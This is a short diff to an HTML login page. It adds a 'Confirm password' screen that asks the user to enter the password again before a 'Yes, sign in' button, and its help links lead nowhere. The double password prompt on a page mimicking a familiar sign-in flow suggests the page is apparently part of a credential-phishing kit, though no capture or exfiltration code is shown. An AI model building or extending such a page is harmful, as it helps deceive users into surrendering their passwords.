@@ -389,10 +389,41 @@
           </p>
         </div>
         <div>
-          <button type="button" class="btn" id="btn_sig">Sign in</button>
+          <button type="button" class="btn" id="btn_confirm">Sign in</button>
         </div>
       </div>
     </section>
+
+    <section id="section_confirm" class="d-none">
+      <div class="auth-wrapper">
+        <img src="assets/logo.svg" alt="logo" class="d-block" />
+        <div class="identity w-100 mt-16 mb-16">
+          <button class="backConfirm">
+            <img src="assets/back.png" />
+          </button>
+          <span id="user_identity">a@b.com</span>
+        </div>
+        <h2 class="title mb-16">Confirm password</h2>
+        <form>
+          <div class="mb-16">
+            <p id="error_confirm" class="error"></p>
+            <input id="inp_confirm" type="password" name="pass" class="input" placeholder="Password" />
+          </div>
+        </form>
+        <div>
+          <p class="mb-16">
+            <a href="/" class="link fs-13">Forgot password?</a>
+          </p>
+          <p class="mb-16">
+            <a href="/" class="link fs-13">Other ways to sign in</a>
+          </p>
+        </div>
+        <div>
+          <button type="button" class="btn" id="btn_sig">Yes, sign in</button>
+        </div>
+      </div>
+    </section>
+
     <section id="section_final" class="d-none">
       <div class="auth-wrapper">
         <img src="logo.png" alt="logo" class="d-block" />
